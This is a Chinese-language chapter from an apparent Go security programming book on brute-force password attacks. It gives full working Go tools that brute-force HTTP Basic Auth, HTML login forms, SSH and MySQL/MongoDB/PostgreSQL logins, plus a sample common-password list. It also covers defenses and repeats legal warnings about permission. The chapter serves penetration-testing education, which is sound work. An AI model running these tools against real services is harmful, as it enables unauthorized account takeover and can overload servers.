# 第八章：暴力破解

暴力破解攻击，也叫穷举键攻击，是指尝试所有可能的输入组合，直到最终得到正确的组合。最常见的例子就是暴力破解密码。你可以尝试所有字符、字母和符号的组合，或者你可以使用字典列表作为密码的基础。你可以在网上找到基于常见密码的字典和预构建的单词列表，或者你也可以自己创建。

暴力破解密码攻击有不同的类型。有在线攻击，比如反复尝试登录网站或数据库。由于网络延迟和带宽限制，在线攻击要慢得多。服务可能还会在尝试失败过多时限制速率或锁定账户。另一方面，也有离线攻击。离线攻击的一个例子是，当你在本地硬盘上有一个包含哈希密码的数据库转储时，你可以在没有限制的情况下进行暴力破解，唯一的限制是物理硬件。严肃的密码破解者会建造配备多块强大显卡的计算机来进行破解，这些计算机的成本高达数万美元。

关于在线暴力破解攻击需要注意的一点是，它们非常容易被检测到，产生大量流量，可能给服务器带来巨大的负载，甚至使其完全崩溃，并且除非得到许可，否则是非法的。关于在线服务的许可可能会引起误解。例如，虽然你在像 Facebook 这样的服务上拥有账户，并不意味着你有权限对自己的账户进行暴力破解攻击。Facebook 仍然拥有服务器，你没有权限攻击他们的网站，即使仅仅是针对你的账户。即便你在自己的服务器上运行 SSH 服务，如 Amazon 服务器，你仍然没有进行暴力破解攻击的权限。你必须获得特别的渗透测试许可，才能对 Amazon 资源进行测试。你可以使用自己的虚拟机进行本地测试。

网络漫画 *xkcd* 有一则漫画完美地与暴力破解密码的主题相关：

![](img/17987bbd-217b-435f-b4eb-bb536d16c4de.png)

来源：https://xkcd.com/936/

这些攻击中的大多数，甚至所有攻击，都可以通过以下一种或多种技术来防护：

+   强密码（理想情况下是密码短语或密钥）

+   在失败尝试时实施速率限制/临时锁定

+   使用 CAPTCHA

+   添加双因素认证

+   对密码进行加盐处理

+   限制对服务器的访问

本章将介绍几个暴力破解的示例，包括以下内容：

+   HTTP 基本认证

+   HTML 登录表单

+   SSH 密码验证

+   数据库

# 暴力破解 HTTP 基本认证

HTTP 基本认证是指在 HTTP 请求中提供用户名和密码。你可以在现代浏览器中将其作为 URL 的一部分传递。参考这个示例：

```
http://username:password@www.example.com
```

当以编程方式添加基本认证时，凭证会作为名为`Authorization`的 HTTP 头提供，该头包含一个值，即`username:password`的 base64 编码值，并以`Basic`为前缀，两者之间用空格分隔。请参见以下示例：

```
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
```

当认证失败时，Web 服务器通常会响应`401 Access Denied`代码，而成功时则应响应`2xx`成功代码，例如`200 OK`。

这个示例将接受一个 URL 和一个`username`值，并尝试使用生成的密码进行登录。

为了减少此类攻击的效果，建议在多次登录失败后实现限流功能或账户锁定功能。

如果您需要从头开始构建自己的密码列表，可以尝试从维基百科上文档化的最常见密码开始，[`en.wikipedia.org/wiki/List_of_the_most_common_passwords`](https://en.wikipedia.org/wiki/List_of_the_most_common_passwords)。以下是您可以保存为`passwords.txt`的简短示例：

```
password
123456
qwerty
abc123
iloveyou
admin
passw0rd
```

将前面代码块中的密码列表保存为一个文本文件，每行一个密码。文件名不重要，因为您会将密码列表文件名作为命令行参数提供：

```
package main 

import ( 
   "bufio" 
   "fmt" 
   "log" 
   "net/http" 
   "os" 
) 

func printUsage() { 
   fmt.Println(os.Args[0] + ` - Brute force HTTP Basic Auth 

Passwords should be separated by newlines. 
URL should include protocol prefix. 

Usage: 
  ` + os.Args[0] + ` <username> <pwlistfile> <url> 

Example: 
  ` + os.Args[0] + ` admin passwords.txt https://www.test.com 
`) 
} 

func checkArgs() (string, string, string) { 
   if len(os.Args) != 4 { 
      log.Println("Incorrect number of arguments.") 
      printUsage() 
      os.Exit(1) 
   } 

   // Username, Password list filename, URL 
   return os.Args[1], os.Args[2], os.Args[3] 
} 

func testBasicAuth(url, username, password string, doneChannel chan bool) { 
   client := &http.Client{} 
   request, err := http.NewRequest("GET", url, nil) 
   request.SetBasicAuth(username, password) 

   response, err := client.Do(request) 
   if err != nil { 
      log.Fatal(err) 
   } 
   if response.StatusCode == 200 { 
      log.Printf("Success!\nUser: %s\nPassword: %s\n", username,   
         password) 
      os.Exit(0) 
    } 
    doneChannel <- true 
} 

func main() { 
   username, pwListFilename, url := checkArgs() 

   // Open password list file 
   passwordFile, err := os.Open(pwListFilename) 
   if err != nil { 
      log.Fatal("Error opening file. ", err) 
   } 
   defer passwordFile.Close() 

   // Default split method is on newline (bufio.ScanLines) 
   scanner := bufio.NewScanner(passwordFile) 

   doneChannel := make(chan bool) 
   numThreads := 0 
   maxThreads := 2 

   // Check each password against url 
   for scanner.Scan() { 
      numThreads += 1 

      password := scanner.Text() 
      go testBasicAuth(url, username, password, doneChannel) 

      // If max threads reached, wait for one to finish before continuing 
      if numThreads >= maxThreads { 
         <-doneChannel 
         numThreads -= 1 
      } 
   } 

   // Wait for all threads before repeating and fetching a new batch 
   for numThreads > 0 { 
      <-doneChannel 
      numThreads -= 1 
   } 
} 
```

# 暴力破解 HTML 登录表单

几乎所有拥有用户系统的网站都会在网页上提供一个登录表单。我们可以编写一个程序，反复提交这个登录表单。这个示例假设该网站应用程序没有启用验证码、限制频率或其他防止攻击的机制。请记住，千万不要对任何生产网站或您没有拥有或许可的网站进行此类攻击。如果您想进行测试，建议您搭建一个本地服务器，只在本地进行测试。

每个网页表单的`username`和`password`字段的名称可能不同，因此在每次执行时需要提供这些字段的名称，并且这些名称必须与所攻击的 URL 特定。

查看源代码或检查目标表单，以获取输入元素的`name`属性以及`form`元素的目标`action`属性。如果`form`元素中未提供 action URL，则默认为当前 URL。另一个重要的信息是表单使用的方法。登录表单应该是`POST`方法，但也有可能编码不当而使用`GET`方法。一些登录表单使用 JavaScript 来提交表单，并可能完全绕过标准的表单方法。使用这类逻辑的网站需要更多的逆向工程才能确定最终的提交目标是什么以及数据是如何格式化的。您可以使用 HTML 代理或使用浏览器中的网络检查器查看 XHR 请求。

后面的章节将讨论网页抓取和在`DOM`接口中查询，以便根据名称或 CSS 选择器找到特定元素，但本章不会讨论尝试自动检测表单字段和识别正确输入元素。这一步必须在此手动完成，但一旦识别出来，暴力破解攻击就可以自行运行。

要防止这类攻击，可以实施验证码系统或速率限制功能。

请注意，每个 Web 应用程序都可以有自己的身份验证方式。这不是一种适合所有情况的解决方案。它提供了一个基本的`HTTP POST`表单登录示例，但需要稍作修改以适应不同的应用程序。

```
package main 

import ( 
   "bufio" 
   "bytes" 
   "fmt" 
   "log" 
   "net/http" 
   "os" 
) 

func printUsage() { 
   fmt.Println(os.Args[0] + ` - Brute force HTTP Login Form 

Passwords should be separated by newlines. 
URL should include protocol prefix. 
You must identify the form's post URL and username and password   
field names and pass them as arguments. 

Usage: 
  ` + os.Args[0] + ` <pwlistfile> <login_post_url> ` + 
      `<username> <username_field> <password_field> 

Example: 
  ` + os.Args[0] + ` passwords.txt` +
      ` https://test.com/login admin username password 
`) 
} 

func checkArgs() (string, string, string, string, string) { 
   if len(os.Args) != 6 { 
      log.Println("Incorrect number of arguments.") 
      printUsage() 
      os.Exit(1) 
   } 

   // Password list, Post URL, username, username field, 
   // password field 
   return os.Args[1], os.Args[2], os.Args[3], os.Args[4], os.Args[5] 
} 

func testLoginForm( 
   url, 
   userField, 
   passField, 
   username, 
   password string, 
   doneChannel chan bool, 
) 
{ 
   postData := userField + "=" + username + "&" + passField + 
      "=" + password 
   request, err := http.NewRequest( 
      "POST", 
      url, 
      bytes.NewBufferString(postData), 
   ) 
   client := &http.Client{} 
   response, err := client.Do(request) 
   if err != nil { 
      log.Println("Error making request. ", err) 
   } 
   defer response.Body.Close() 

   body := make([]byte, 5000) // ~5k buffer for page contents 
   response.Body.Read(body) 
   if bytes.Contains(body, []byte("ERROR")) { 
      log.Println("Error found on website.") 
   } 
   log.Printf("%s", body) 

   if bytes.Contains(body,[]byte("ERROR")) || response.StatusCode != 200 { 
      // Error on page or in response code 
   } else { 
      log.Println("Possible success with password: ", password) 
      // os.Exit(0) // Exit on success? 
   } 

   doneChannel <- true 
} 

func main() { 
   pwList, postUrl, username, userField, passField := checkArgs() 

   // Open password list file 
   passwordFile, err := os.Open(pwList) 
   if err != nil { 
      log.Fatal("Error opening file. ", err) 
   } 
   defer passwordFile.Close() 

   // Default split method is on newline (bufio.ScanLines) 
   scanner := bufio.NewScanner(passwordFile) 

   doneChannel := make(chan bool) 
   numThreads := 0 
   maxThreads := 32 

   // Check each password against url 
   for scanner.Scan() { 
      numThreads += 1 

      password := scanner.Text() 
      go testLoginForm( 
         postUrl, 
         userField, 
         passField, 
         username, 
         password, 
         doneChannel, 
      ) 

      // If max threads reached, wait for one to finish before  
      //continuing 
      if numThreads >= maxThreads { 
         <-doneChannel 
         numThreads -= 1 
      } 
   } 

   // Wait for all threads before repeating and fetching a new batch 
   for numThreads > 0 { 
      <-doneChannel 
      numThreads -= 1 
   } 
} 
```

# SSH 的暴力破解

安全外壳或 SSH 支持几种身份验证机制。如果服务器仅支持公钥身份验证，那么暴力破解尝试几乎是徒劳的。这个例子仅仅关注 SSH 的密码身份验证。

要防止这种攻击，可以实施速率限制或使用像 fail2ban 这样的工具，在检测到多次失败的登录尝试后暂时锁定账户。还要禁用 root 远程登录。有些人喜欢将 SSH 放在非标准端口上，但最终可能将其放在像`2222`这样的高端非限制端口上，这不是一个好主意。如果您使用高端非特权端口（如`2222`），那么另一个低特权用户可能会劫持该端口，并在其下运行自己的服务，如果端口崩溃则会产生这种情况。如果您想要更改端口，请将 SSH 守护程序放在低于`1024`的端口上，以此来更改默认设置。

这种攻击在日志中显然很嘈杂，易于检测，并且可以通过像 fail2ban 这样的工具进行阻止。但是如果你在进行渗透测试，检查是否存在速率限制或账户锁定功能可以作为一个快速方法。如果没有配置速率限制或临时账户锁定，暴力破解和 DDoS 攻击就是潜在风险。

运行此程序需要从[golang.org](http://www.golang.org)获取一个 SSH 包。您可以使用以下命令获取它：

```
go get golang.org/x/crypto/ssh
```

安装所需的`ssh`包后，您可以运行以下示例：

```
package main 

import ( 
   "bufio" 
   "fmt" 
   "log" 
   "os" 

   "golang.org/x/crypto/ssh" 
) 

func printUsage() { 
   fmt.Println(os.Args[0] + ` - Brute force SSH Password 

Passwords should be separated by newlines. 
URL should include hostname or ip with port number separated by colon 

Usage: 
  ` + os.Args[0] + ` <username> <pwlistfile> <url:port> 

Example: 
  ` + os.Args[0] + ` root passwords.txt example.com:22 
`) 
} 

func checkArgs() (string, string, string) { 
   if len(os.Args) != 4 { 
      log.Println("Incorrect number of arguments.") 
      printUsage() 
      os.Exit(1) 
   } 

   // Username, Password list filename, URL 
   return os.Args[1], os.Args[2], os.Args[3] 
} 

func testSSHAuth(url, username, password string, doneChannel chan bool) { 
   sshConfig := &ssh.ClientConfig{ 
      User: username, 
      Auth: []ssh.AuthMethod{ 
         ssh.Password(password), 
      }, 
      // Do not check server key 
      HostKeyCallback: ssh.InsecureIgnoreHostKey(), 

      // Or, set the expected ssh.PublicKey from remote host 
      //HostKeyCallback: ssh.FixedHostKey(pubkey), 
   } 

   _, err := ssh.Dial("tcp", url, sshConfig) 
   if err != nil { 
      // Print out the error so we can see if it is just a failed   
      // auth or if it is a connection/name resolution problem. 
      log.Println(err) 
   } else { // Success 
      log.Printf("Success!\nUser: %s\nPassword: %s\n", username,   
      password) 
      os.Exit(0) 
   } 

   doneChannel <- true // Signal another thread spot has opened up 
} 

func main() { 

   username, pwListFilename, url := checkArgs() 

   // Open password list file 
   passwordFile, err := os.Open(pwListFilename) 
   if err != nil { 
      log.Fatal("Error opening file. ", err) 
   } 
   defer passwordFile.Close() 

   // Default split method is on newline (bufio.ScanLines) 
   scanner := bufio.NewScanner(passwordFile) 

   doneChannel := make(chan bool) 
   numThreads := 0 
   maxThreads := 2 

   // Check each password against url 
   for scanner.Scan() { 
      numThreads += 1 

      password := scanner.Text() 
      go testSSHAuth(url, username, password, doneChannel) 

      // If max threads reached, wait for one to finish before continuing 
      if numThreads >= maxThreads { 
         <-doneChannel 
         numThreads -= 1 
      } 
   } 

   // Wait for all threads before repeating and fetching a new batch 
   for numThreads > 0 { 
      <-doneChannel 
      numThreads -= 1 
   } 
} 
```

# 数据库登录的暴力破解

数据库登录可以像其他方法一样自动化和暴力破解。在前面的暴力破解示例中，大部分代码都是相同的。这些应用程序之间的主要区别在于实际测试认证的功能。而不是再次重复所有代码，这些片段将简单地演示如何登录到各种数据库。修改前面的暴力破解脚本，以测试这些数据库之一，而不是 SSH 或 HTTP 方法。

要防止这种情况发生，请限制数据库访问仅限于需要的机器，并禁用 root 远程登录。

Go 语言的标准库并未提供任何数据库驱动，只提供了接口。因此，所有这些数据库示例都需要一个来自 GitHub 的第三方包，以及一个正在运行的数据库实例来进行连接。本书不涉及如何安装和配置这些数据库服务。每个包可以通过`go get`命令进行安装：

+   MySQL: [`github.com/go-sql-driver/mysql`](https://github.com/go-sql-driver/mysql)

+   MongoDB: [`github.com/go-mgo/mgo`](https://github.com/go-mgo/mgo)

+   PostgreSQL: [`github.com/lib/pq`](https://github.com/lib/pq)

这个示例结合了三种数据库库，并提供了一个工具，可以对 MySQL、MongoDB 或 PostgreSQL 进行暴力破解。数据库类型通过命令行参数指定，并且包括用户名、主机、密码文件和数据库名称。MongoDB 和 MySQL 不需要像 PostgreSQL 那样指定数据库名称，因此在不使用`postgres`选项时，数据库名称是可选的。一个名为`loginFunc`的特殊变量被创建来存储与指定数据库类型相关的登录函数。这是我们第一次使用变量来保存函数。然后，登录函数被用来执行暴力破解攻击：

```
package main 

import ( 
   "database/sql" 
   "log" 
   "time" 

   // Underscore means only import for 
   // the initialization effects. 
   // Without it, Go will throw an 
   // unused import error since the mysql+postgres 
   // import only registers a database driver 
   // and we use the generic sql.Open() 
   "bufio" 
   "fmt" 
   _ "github.com/go-sql-driver/mysql" 
   _ "github.com/lib/pq" 
   "gopkg.in/mgo.v2" 
   "os" 
) 

// Define these at the package level since they don't change, 
// so we don't have to pass them around between functions 
var ( 
   username string 
   // Note that some databases like MySQL and Mongo 
   // let you connect without specifying a database name 
   // and the value will be omitted when possible 
   dbName        string 
   host          string 
   dbType        string 
   passwordFile  string 
   loginFunc     func(string) 
   doneChannel   chan bool 
   activeThreads = 0 
   maxThreads    = 10 
) 

func loginPostgres(password string) { 
   // Create the database connection string 
   // postgres://username:password@host/database 
   connStr := "postgres://" 
   connStr += username + ":" + password 
   connStr += "@" + host + "/" + dbName 

   // Open does not create database connection, it waits until 
   // a query is performed 
   db, err := sql.Open("postgres", connStr) 
   if err != nil { 
      log.Println("Error with connection string. ", err) 
   } 

   // Ping will cause database to connect and test credentials 
   err = db.Ping() 
   if err == nil { // No error = success 
      exitWithSuccess(password) 
   } else { 
      // The error is likely just an access denied, 
      // but we print out the error just in case it 
      // is a connection issue that we need to fix 
      log.Println("Error authenticating with Postgres. ", err) 
   } 
   doneChannel <- true 
} 

func loginMysql(password string) { 
   // Create database connection string 
   // user:password@tcp(host)/database?charset=utf8 
   // The database name is not required for a MySQL 
   // connection so we leave it off here. 
   // A user may have access to multiple databases or 
   // maybe we do not know any database names 
   connStr := username + ":" + password 
   connStr += "@tcp(" + host + ")/" // + dbName 
   connStr += "?charset=utf8" 

   // Open does not create database connection, it waits until 
   // a query is performed 
   db, err := sql.Open("mysql", connStr) 
   if err != nil { 
      log.Println("Error with connection string. ", err) 
   } 

   // Ping will cause database to connect and test credentials 
   err = db.Ping() 
   if err == nil { // No error = success 
      exitWithSuccess(password) 
   } else { 
      // The error is likely just an access denied, 
      // but we print out the error just in case it 
      // is a connection issue that we need to fix 
      log.Println("Error authenticating with MySQL. ", err) 
   } 
   doneChannel <- true 
} 

func loginMongo(password string) { 
   // Define Mongo connection info 
   // mgo does not use the Go sql driver like the others 
   mongoDBDialInfo := &mgo.DialInfo{ 
      Addrs:   []string{host}, 
      Timeout: 10 * time.Second, 
      // Mongo does not require a database name 
      // so it is omitted to improve auth chances 
      //Database: dbName, 
      Username: username, 
      Password: password, 
   } 
   _, err := mgo.DialWithInfo(mongoDBDialInfo) 
   if err == nil { // No error = success 
      exitWithSuccess(password) 
   } else { 
      log.Println("Error connecting to Mongo. ", err) 
   } 
   doneChannel <- true 
} 

func exitWithSuccess(password string) { 
   log.Println("Success!") 
   log.Printf("\nUser: %s\nPass: %s\n", username, password) 
   os.Exit(0) 
} 

func bruteForce() { 
   // Load password file 
   passwords, err := os.Open(passwordFile) 
   if err != nil { 
      log.Fatal("Error opening password file. ", err) 
   } 

   // Go through each password, line-by-line 
   scanner := bufio.NewScanner(passwords) 
   for scanner.Scan() { 
      password := scanner.Text() 

      // Limit max goroutines 
      if activeThreads >= maxThreads { 
         <-doneChannel // Wait 
         activeThreads -= 1 
      } 

      // Test the login using the specified login function 
      go loginFunc(password) 
      activeThreads++ 
   } 

   // Wait for all threads before returning 
   for activeThreads > 0 { 
      <-doneChannel 
      activeThreads -= 1 
   } 
} 

func checkArgs() (string, string, string, string, string) { 
   // Since the database name is not required for Mongo or Mysql 
   // Just set the dbName arg to anything. 
   if len(os.Args) == 5 && 
      (os.Args[1] == "mysql" || os.Args[1] == "mongo") { 
      return os.Args[1], os.Args[2], os.Args[3], os.Args[4],   
      "IGNORED" 
   } 
   // Otherwise, expect all arguments. 
   if len(os.Args) != 6 { 
      printUsage() 
      os.Exit(1) 
   } 
   return os.Args[1], os.Args[2], os.Args[3], os.Args[4], os.Args[5] 
} 

func printUsage() { 
   fmt.Println(os.Args[0] + ` - Brute force database login  

Attempts to brute force a database login for a specific user with  
a password list. Database name is ignored for MySQL and Mongo, 
any value can be provided, or it can be omitted. Password file 
should contain passwords separated by a newline. 

Database types supported: mongo, mysql, postgres 

Usage: 
  ` + os.Args[0] + ` (mysql|postgres|mongo) <pwFile>` +
     ` <user> <host>[:port] <dbName> 

Examples: 
  ` + os.Args[0] + ` postgres passwords.txt nanodano` +
      ` localhost:5432  myDb   
  ` + os.Args[0] + ` mongo passwords.txt nanodano localhost 
  ` + os.Args[0] + ` mysql passwords.txt nanodano localhost`) 
} 

func main() { 
   dbType, passwordFile, username, host, dbName = checkArgs() 

   switch dbType { 
   case "mongo": 
       loginFunc = loginMongo 
   case "postgres": 
       loginFunc = loginPostgres 
   case "mysql": 
       loginFunc = loginMysql 
   default: 
       fmt.Println("Unknown database type: " + dbType) 
       fmt.Println("Expected: mongo, postgres, or mysql") 
       os.Exit(1) 
   } 

   doneChannel = make(chan bool) 
   bruteForce() 
} 
```

# 总结

阅读本章后，你将理解基本的暴力破解攻击如何针对不同的应用程序工作。你应该能够根据自己的需求，将此处给出的示例调整用于攻击不同的协议。

请记住，这些示例可能会带来危险，甚至可能导致服务拒绝（DoS）攻击，不建议你将它们应用于生产服务，除非目的是测试你的暴力破解防护措施。仅在你控制、获得测试许可且了解后果的服务上执行这些测试。你绝不能将这些示例或此类攻击用于你不拥有的服务，否则你可能会违反法律并陷入严重的法律困境。

在进行测试时，有些法律界限可能很难区分。例如，如果你租用了硬件设备，从技术上讲，你并不拥有它，即便它位于你的数据中心，你也需要获得许可才能进行测试。类似地，如果你从像亚马逊这样的提供商租用托管服务，你在执行渗透测试之前必须获得他们的许可，否则可能会因违反服务条款而面临后果。

在下一章中，我们将讨论如何使用 Go 语言构建 Web 应用程序，并利用 HTTPS、安全 Cookies 和安全 HTTP 头、转义 HTML 输出和添加日志等最佳实践来加固它们并提升安全性。我们还将探讨如何作为客户端使用 Web 应用程序，通过发起请求、使用客户端 SSL 证书和使用代理来消费 Web 应用程序。
